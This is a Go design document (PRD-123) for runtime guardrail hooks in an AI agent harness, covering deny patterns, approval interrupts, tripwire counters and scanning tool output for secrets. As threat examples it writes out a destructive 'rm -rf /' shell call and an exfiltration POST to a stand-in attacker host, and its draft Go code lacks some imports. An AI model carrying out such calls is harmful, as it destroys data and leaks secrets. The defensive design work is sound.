# PRD-123: Runtime Guardrail Hooks/Tripwire (`tag guardrail runtime`)

> **Stack: Go** (native single-binary; see docs/GO_MIGRATION_RESEARCH.md). This PRD was re-framed from Python to Go.

**Status:** Proposed
**Priority:** P1
**Estimated Effort:** M (5-8 days)
**Category:** Security/Guardrails
**Affects:** `internal/runtime/guardrail/runtime.go` + `internal/tool` (permission-gate middleware) + `internal/cli`
**Depends on:** PRD-124 (GuardrailResult type), PRD-121 (output guardrail processor), PRD-122 (input guardrail validator), PRD-013 (agent tracing — span hooks)
**Inspired by:** Nemo Guardrails dialogue flow rails, LangGraph interrupt() safety hooks, Guardrails AI validators on tool calls, Anthropic safety layer

---

## 1. Overview

Input guardrails (PRD-122) validate prompts before they reach the model. Output guardrails (PRD-121) validate responses before they reach the caller. But neither catches dangerous behavior during execution: a tool call that deletes files, a mid-run state where the agent is about to make an irreversible API call, or a tool call sequence that matches a known attack pattern (e.g., exfiltration via repeated `curl` calls).

Runtime Guardrail Hooks/Tripwire (`tag guardrail runtime`) introduces hooks that intercept agent behavior between steps — specifically at tool call boundaries. A runtime guardrail is associated with a tool name or tool call pattern and executes before or after that tool call: before (pre-hook) to approve or block the call, or after (post-hook) to validate the return value. Runtime guardrails can also be "tripwires" — silent detectors that accumulate evidence of suspicious patterns and trigger a HITL interrupt (PRD-109) or abort when a threshold is met.

The design is inspired by LangGraph's `interrupt()` pattern (pause before risky actions), Nemo Guardrails' action hooks (intercept LLM actions), and the concept of runtime application self-protection (RASP) in traditional security. In the Go harness the hooks are implemented as **middleware in the agent loop**: they wrap the unified tool-dispatch interface (`internal/tool`, `Info/Run/ProviderOptions` — the same gate that hosts the rule-based wildcard permission engine) and fire at the `TOOL` span boundary emitted by `internal/obs` (PRD-013). A `RuntimeGuardrail` is a Go interface with `CheckPre`/`CheckPost` methods; the registry composes the configured hooks around every `Run(ctx, ToolCall)`.

---

## 2. Problem Statement

### 2.1 No interception at tool call boundaries

An agent may generate perfectly safe outputs but call dangerous tools: `shell_execute("rm -rf /")`, `http_post("http://attacker.com/exfil", data=secrets)`. Without runtime hooks, these calls execute without any safety check.

### 2.2 No accumulating anomaly detection

A single `curl` call is fine; 50 `curl` calls to external hosts in one session is suspicious. There is no mechanism to accumulate behavioral signals across tool calls and trigger a guardrail when a threshold is reached.

### 2.3 No approval gate for high-risk tools

High-risk tools (file deletion, external HTTP, database write) should require human approval before execution (PRD-109). Currently there is no way to automatically trigger an interrupt for specific tool names.

---

## 3. Goals

| ID | Goal |
|----|------|
| G1 | `RuntimeGuardrailHook` is a pre/post hook attached to a tool name or pattern; runs at TOOL span boundaries. |
| G2 | Pre-hook result `block` prevents the tool call from executing and returns an error to the agent. |
| G3 | Pre-hook result `interrupt` triggers a PRD-109 HITL interrupt for human approval before the tool call. |
| G4 | Post-hook validates tool return values (e.g., ensure HTTP response was not an error, ensure no secrets in output). |
| G5 | Tripwire guardrails accumulate counters per session (e.g., `external_http_calls`) and trigger when threshold exceeded. |
| G6 | All hook decisions logged to `guardrail_events` with `direction='runtime'`. |
| G7 | `tag guardrail runtime add --tool TOOL_PATTERN --type GUARDRAIL_TYPE` configures a runtime hook. |

## 3.1 Non-Goals

| ID | Non-Goal |
|----|----------|
| NG1 | Hooking into third-party tool execution outside TAG's span system. |
| NG2 | Blocking all tool calls by default (opt-in only). |
| NG3 | Retroactive hook execution on completed runs. |
| NG4 | Network-level packet inspection. |

---

## 4. Success Metrics

| Metric | Target | Measurement |
|--------|--------|-------------|
| Pre-hook latency | < 5ms for regex-based hooks | Benchmark test |
| HITL interrupt trigger | Pre-hook triggers PRD-109 interrupt within 100ms of tool call detection | Integration test |
| Tripwire accuracy | Tripwire triggers at exactly the configured threshold count | Unit test |
| Block enforcement | Blocked tool calls are never executed in 100% of test cases | Unit test |

---

## 5. User Stories

| ID | As a... | I want to... | So that... |
|----|---------|-------------|------------|
| US1 | Security engineer | Block shell tool calls containing `rm -rf` | I prevent destructive shell execution |
| US2 | Platform engineer | Require human approval before any `http_post` to external domains | I prevent data exfiltration |
| US3 | Security engineer | Set a tripwire that fires after 10 external HTTP calls in one session | I detect exfiltration patterns |
| US4 | Developer | Validate that tool return values don't contain secrets | I catch leakage in tool responses |

---

## 6. CLI Surface

```
tag guardrail runtime <subcommand> [options]

Subcommands:
  add        Add a runtime guardrail hook
  list       List configured runtime hooks for a profile
  remove     Remove a runtime hook
  test       Simulate a tool call against configured hooks
  history    Show recent runtime guardrail decisions

tag guardrail runtime add \
  --profile default \
  --tool "shell_execute" \
  --type deny-pattern \
  --pattern "rm -rf" \
  --action block

tag guardrail runtime add \
  --profile default \
  --tool "http_post" \
  --type require-approval \
  --action interrupt \
  --message "HTTP POST about to execute. Approve?"

tag guardrail runtime add \
  --profile default \
  --tool "http_*" \
  --type tripwire \
  --threshold 10 \
  --window 1h \
  --action interrupt \
  --message "Agent has made {{count}} external HTTP calls this session."

tag guardrail runtime add \
  --profile default \
  --tool "*" \
  --hook-point post \
  --type output-secret-scan \
  --action warn

Options:
  --tool PATTERN      Tool name or glob pattern (e.g., "http_*", "*")
  --type TYPE         Guardrail type: deny-pattern|require-approval|tripwire|output-secret-scan
  --action ACTION     block|interrupt|warn
  --hook-point        pre|post (default: pre)
  --pattern TEXT      Regex pattern to match in tool arguments (for deny-pattern)
  --threshold N       Tripwire count threshold
  --window DURATION   Tripwire time window
  --message TEXT      Message shown on interrupt
```

---

## 7. Functional Requirements

| ID | Requirement |
|----|------------|
| FR-01 | At every TOOL span start (inside the `internal/tool` dispatch middleware), the runtime calls `RuntimeGuardrailRegistry.CheckPre(ctx, toolName, toolArgs)`; the post path calls `CheckPost(ctx, toolName, toolResult)` at span end. |
| FR-02 | `deny-pattern` hook: marshal `toolArgs` to JSON, match against the `--pattern` regexp (`regexp.Regexp`, `(?i)` case-insensitive, pre-compiled at registry load); return `block` if matched. |
| FR-03 | `require-approval` hook: return `interrupt` with the configured `--message`; PRD-109 handles the HITL interrupt. |
| FR-04 | `tripwire` hook: increment a per-session counter for the tool pattern; if counter ≥ threshold within the window, return `interrupt`. |
| FR-05 | `output-secret-scan` post-hook: scan tool return value for secrets (PRD-034); return `warn` with the detected secret type. |
| FR-06 | `block` action: the tool call is not dispatched; agent receives a `GuardrailBlocked` error response as the tool result. |
| FR-07 | `interrupt` action: the workflow is paused via PRD-109 `interrupt()`; on operator approval, the tool call executes normally. |
| FR-08 | `warn` action: tool call executes normally; a warning is logged to `guardrail_events` and printed to stderr. |
| FR-09 | All hook decisions (including pass) written to `guardrail_events` with `direction='runtime'`, `tool_name`, `action`, `reason`. |
| FR-10 | `tag guardrail runtime test --tool "shell_execute" --args '{"command": "rm -rf /tmp"}'` dry-runs all hooks against the mock tool call (no dispatch, no side effects). |

---

## 8. Non-Functional Requirements

| ID | Requirement |
|----|------------|
| NFR-01 | Pre-hooks must not add more than 10ms to any tool call dispatch path. |
| NFR-02 | Tripwire counters persisted in `modernc.org/sqlite` (not in-memory) to survive process restart; increment uses the store's single-writer path. |
| NFR-03 | Hook registry is loaded once at process start into an immutable in-memory slice and cached; config changes require process restart. |
| NFR-04 | Tool-name glob matching (`http_*`) uses pre-compiled `gobwas/glob` matchers (the same glob lib used by `internal/obs` pricing) built once at registry load; each match is allocation-free. |

---

## 9. Technical Design

### 9.1 SQLite DDL

Schema is created by the `internal/store` migrator (modernc.org/sqlite, CGO_ENABLED=0). DDL is identical:

```sql
CREATE TABLE IF NOT EXISTS runtime_guardrail_configs (
  id              TEXT PRIMARY KEY,
  profile         TEXT NOT NULL,
  tool_pattern    TEXT NOT NULL,
  guardrail_type  TEXT NOT NULL,
  action          TEXT NOT NULL DEFAULT 'block',
  hook_point      TEXT NOT NULL DEFAULT 'pre',
  pattern         TEXT,
  threshold       INTEGER,
  window_s        INTEGER,
  message         TEXT,
  enabled         INTEGER NOT NULL DEFAULT 1,
  created_at      TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS tripwire_counters (
  id          TEXT PRIMARY KEY,
  session_id  TEXT NOT NULL,
  config_id   TEXT NOT NULL REFERENCES runtime_guardrail_configs(id),
  count       INTEGER NOT NULL DEFAULT 0,
  window_start TEXT NOT NULL,
  updated_at  TEXT NOT NULL,
  UNIQUE(session_id, config_id)
);
```

### 9.2 Go core (`internal/runtime/guardrail`)

The registry loads all enabled configs once at start, pre-compiling each `tool_pattern` into a `glob.Glob` and each deny `pattern` into a `*regexp.Regexp`. `CheckPre`/`CheckPost` run the configured hooks in order and return on the first non-pass result. Tripwire counters go through the shared `internal/store` (modernc.org/sqlite) so they survive restart.

```go
package guardrail

import (
	"context"
	"encoding/json"
	"fmt"
	"regexp"

	"github.com/gobwas/glob"

	"github.com/tag-agent/tag/internal/store"
)

// SecretScanner is satisfied by the PRD-034 scanner; injected to keep this
// package dependency-light and testable.
type SecretScanner interface {
	ScanText(s string) []SecretFinding
}
type SecretFinding struct{ Type string }

type hook struct {
	cfg     RuntimeConfig      // row from runtime_guardrail_configs
	toolPat glob.Glob          // pre-compiled tool_pattern
	denyRe  *regexp.Regexp     // pre-compiled deny pattern (nil unless deny-pattern)
}

// RuntimeGuardrailRegistry is loaded once and treated as immutable.
type RuntimeGuardrailRegistry struct {
	profile string
	pre     []hook
	post    []hook
	tw      *store.TripwireStore
	scanner SecretScanner
}

func NewRegistry(ctx context.Context, st *store.Store, profile string, sc SecretScanner) (*RuntimeGuardrailRegistry, error) {
	cfgs, err := st.LoadRuntimeGuardrailConfigs(ctx, profile) // WHERE profile=? AND enabled=1
	if err != nil {
		return nil, err
	}
	r := &RuntimeGuardrailRegistry{profile: profile, tw: st.Tripwire(), scanner: sc}
	for _, c := range cfgs {
		g, err := glob.Compile(c.ToolPattern)
		if err != nil {
			return nil, fmt.Errorf("guardrail %s: bad tool pattern: %w", c.ID, err)
		}
		h := hook{cfg: c, toolPat: g}
		if c.GuardrailType == "deny-pattern" && c.Pattern != "" {
			if h.denyRe, err = regexp.Compile("(?i)" + c.Pattern); err != nil {
				return nil, fmt.Errorf("guardrail %s: bad deny regexp: %w", c.ID, err)
			}
		}
		if c.HookPoint == "post" {
			r.post = append(r.post, h)
		} else {
			r.pre = append(r.pre, h)
		}
	}
	return r, nil
}

func (r *RuntimeGuardrailRegistry) CheckPre(ctx context.Context, toolName string, toolArgs map[string]any, sessionID string) GuardrailResult {
	for _, h := range r.pre {
		if !h.toolPat.Match(toolName) {
			continue
		}
		if res := r.apply(ctx, h, toolArgs, sessionID); res.Action != ActionPass {
			return res
		}
	}
	return Pass("runtime")
}

func (r *RuntimeGuardrailRegistry) CheckPost(ctx context.Context, toolName, toolResult, sessionID string) GuardrailResult {
	for _, h := range r.post {
		if !h.toolPat.Match(toolName) {
			continue
		}
		if h.cfg.GuardrailType == "output-secret-scan" {
			if f := r.scanner.ScanText(toolResult); len(f) > 0 {
				res := GuardrailResult{Action: GuardrailAction(h.cfg.Action), Guardrail: "runtime",
					Reason: "SECRET_IN_TOOL_OUTPUT:" + f[0].Type}
				return res
			}
		}
	}
	return Pass("runtime")
}

func (r *RuntimeGuardrailRegistry) apply(ctx context.Context, h hook, toolArgs map[string]any, sessionID string) GuardrailResult {
	action := GuardrailAction(h.cfg.Action)
	switch h.cfg.GuardrailType {
	case "deny-pattern":
		if h.denyRe != nil {
			b, _ := json.Marshal(toolArgs)
			if h.denyRe.Match(b) {
				p := h.cfg.Pattern
				if len(p) > 50 {
					p = p[:50]
				}
				return GuardrailResult{Action: action, Guardrail: "runtime", Reason: "DENY_PATTERN:" + p}
			}
		}
	case "require-approval":
		msg := h.cfg.Message
		return GuardrailResult{Action: action, Guardrail: "runtime", Reason: "REQUIRE_APPROVAL", Message: &msg}
	case "tripwire":
		count := r.tw.Increment(ctx, h.cfg.ID, sessionID) // atomic UPSERT + read, single-writer store
		threshold := h.cfg.Threshold
		if threshold == 0 {
			threshold = 10
		}
		if count >= threshold {
			msg := strings.ReplaceAll(orDefault(h.cfg.Message, "Tripwire triggered"), "{{count}}", strconv.Itoa(count))
			return GuardrailResult{Action: action, Guardrail: "runtime",
				Reason: fmt.Sprintf("TRIPWIRE:%d", count), Message: &msg}
		}
	}
	return Pass("runtime")
}
```

`store.TripwireStore.Increment` performs the `INSERT … ON CONFLICT(session_id,config_id) DO UPDATE SET count=count+1` UPSERT and returns the new count in one round-trip through the single-writer store (the append-only, non-repudiable increment the security section requires). `require-approval` and threshold-crossing `tripwire` results carry `ActionInterrupt`, which the agent loop routes to the PRD-109 HITL interrupt. `block` results are returned to the loop as the tool result (a `GuardrailBlocked` error) so the tool is never dispatched.

---

## 10. Security Considerations

| Risk | Mitigation |
|------|-----------|
| Guardrail bypass via obfuscated tool arguments | Pre-hook checks decoded/normalized args (JSON parsed, not raw string) |
| Tripwire counter manipulation via SQLite access | Tripwire table uses UNIQUE constraint; non-repudiable append-only increment |
| Interrupt approval bypassing block | `interrupt` action only pauses; block action never dispatches |

---

## 11. Testing Strategy

| Layer | Tests |
|-------|-------|
| Unit | `deny-pattern` regex match; tripwire counter increment; glob pattern matching |
| Integration | Full hook execution: shell_execute with `rm -rf` pattern → block → audit log |
| Security | Obfuscated pattern bypass attempt; tripwire reset attempt |

---

## 12. Acceptance Criteria

| ID | Criterion |
|----|----------|
| AC-01 | `shell_execute({"command": "rm -rf /"})` is blocked by deny-pattern hook |
| AC-02 | `http_post` with `require-approval` hook triggers PRD-109 interrupt |
| AC-03 | 10th `http_*` call in a session triggers tripwire interrupt |
| AC-04 | Tool result with API key triggers `output-secret-scan` warn |
| AC-05 | All hook decisions logged to `guardrail_events` with `direction='runtime'` |

---

## 13. Dependencies

| Dependency | Reason |
|-----------|--------|
| PRD-124 GuardrailResult | Shared result type |
| PRD-013 agent tracing | TOOL span boundary hooks |
| PRD-109 HITL interrupt | `interrupt` action implementation |
| PRD-034 secret scanning | Post-hook secret detection |

---

## 14. Open Questions

| ID | Question |
|----|---------|
| OQ-01 | Should tripwire thresholds be profile-configurable (not just per-guardrail)? |
| OQ-02 | Should the `interrupt` action support custom approval forms (not just free-text)? |

---

## 15. Complexity & Timeline

**Complexity:** Medium (M)
**Estimated effort:** 5–8 engineer-days

| Phase | Work | Days |
|-------|------|------|
| 1 | `RuntimeGuardrailRegistry`, `deny-pattern`, `require-approval`, unit tests | 2 |
| 2 | Tripwire counters, post-hook `output-secret-scan`, integration tests | 2 |
| 3 | TOOL span boundary integration (PRD-013), CLI commands | 2 |
| 4 | Documentation, security tests | 1 |

